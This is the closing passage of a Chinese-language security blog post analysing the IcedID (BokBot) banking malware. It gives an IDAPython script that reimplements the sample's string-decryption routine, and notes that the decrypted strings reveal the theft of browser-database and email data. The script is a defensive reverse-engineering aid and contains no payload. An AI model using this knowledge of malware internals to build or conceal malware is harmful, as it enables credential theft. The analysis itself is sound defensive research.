<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211223225301142.png" alt="image-20211223225301142"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> malduck <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> malduck.bits <span class="keyword">import</span> rol, ror</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_round_key</span>(<span class="params">seed</span>):</span><br><span class="line">    <span class="comment"># .text:0000000180015B00 decrypt_string_shifting proc near       ; CODE XREF: decrypt_string+65↑p</span></span><br><span class="line">    <span class="comment"># .text:0000000180015B00                                         ; sub_18000A56C+117↑p ...</span></span><br><span class="line">    <span class="comment"># .text:0000000180015B00                 lea     eax, [rcx+2E59h]</span></span><br><span class="line">    <span class="comment"># .text:0000000180015B06                 ror     eax, 1</span></span><br><span class="line">    <span class="comment"># .text:0000000180015B08                 ror     eax, 1</span></span><br><span class="line">    <span class="comment"># .text:0000000180015B0A                 ror     eax, 2</span></span><br><span class="line">    <span class="comment"># .text:0000000180015B0D                 xor     eax, 151Dh</span></span><br><span class="line">    <span class="comment"># .text:0000000180015B12                 rol     eax, 2</span></span><br><span class="line">    <span class="comment"># .text:0000000180015B15                 rol     eax, 1</span></span><br><span class="line">    <span class="comment"># .text:0000000180015B17                 retn</span></span><br><span class="line">    <span class="comment"># .text:0000000180015B17 decrypt_string_shifting endp</span></span><br><span class="line">    eax = seed + <span class="number">0x2E59</span></span><br><span class="line">    eax = ror(eax, <span class="number">1</span>)</span><br><span class="line">    eax = ror(eax, <span class="number">1</span>)</span><br><span class="line">    eax = ror(eax, <span class="number">2</span>)</span><br><span class="line">    eax = struct.unpack(<span class="string">&quot;I&quot;</span>, xor(struct.pack(<span class="string">&quot;I&quot;</span>, eax)[<span class="number">0</span>:<span class="number">2</span>], struct.pack(<span class="string">&quot;H&quot;</span>, <span class="number">0x151D</span>)) + struct.pack(<span class="string">&quot;I&quot;</span>, eax)[<span class="number">2</span>:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">    eax = rol(eax, <span class="number">2</span>)</span><br><span class="line">    eax = rol(eax, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> eax</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_string</span>(<span class="params">offset</span>):</span><br><span class="line">    b = ida_bytes.get_bytes(offset, <span class="number">0x200</span>)</span><br><span class="line">    str_size = struct.unpack(<span class="string">&quot;H&quot;</span>, xor(b[<span class="number">4</span>:<span class="number">6</span>], b[<span class="number">0</span>:<span class="number">2</span>]))[<span class="number">0</span>]</span><br><span class="line">    xor_key_index = <span class="number">6</span></span><br><span class="line">    decrypted_string = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    seed = ida_bytes.get_dword(offset)</span><br><span class="line">    <span class="keyword">for</span> current_offset <span class="keyword">in</span> <span class="built_in">range</span>(str_size):</span><br><span class="line">        seed = generate_round_key(seed)</span><br><span class="line">        current_dec_chr = b[xor_key_index] ^ (seed &amp; <span class="number">0xFF</span>)</span><br><span class="line">        xor_key_index += <span class="number">1</span></span><br><span class="line">        decrypted_string += <span class="built_in">chr</span>(current_dec_chr)</span><br><span class="line">    <span class="keyword">return</span> decrypted_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is an example script that implements the core decryption</span></span><br><span class="line"><span class="comment"># algorithm of current IcedID samples.</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x1800207C0</span></span><br><span class="line">end = <span class="number">0x180026366</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;outString.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f.write(decrypt_string(i))</span><br><span class="line">        <span class="comment">#print(decrypt_string(i))</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>解密出来字符串如下，可以看出是一些对浏览器数据库的读取，headers的设置，邮件信息等的窃取。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220107152908100.png" alt="image-20220107152908100"></p>
</p><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>Author: scr1pt</div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-23</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 1655 words, 5 min 31 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://Scr1pt-kid.github.io/2022/03/23/bokbot-analysis/,scr1pt's blog,bokbot-analysis,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/03/29/mining-sh-analysis/" title="mining-sh-analysis">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/03/23/cruloader/" title="cruloader">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>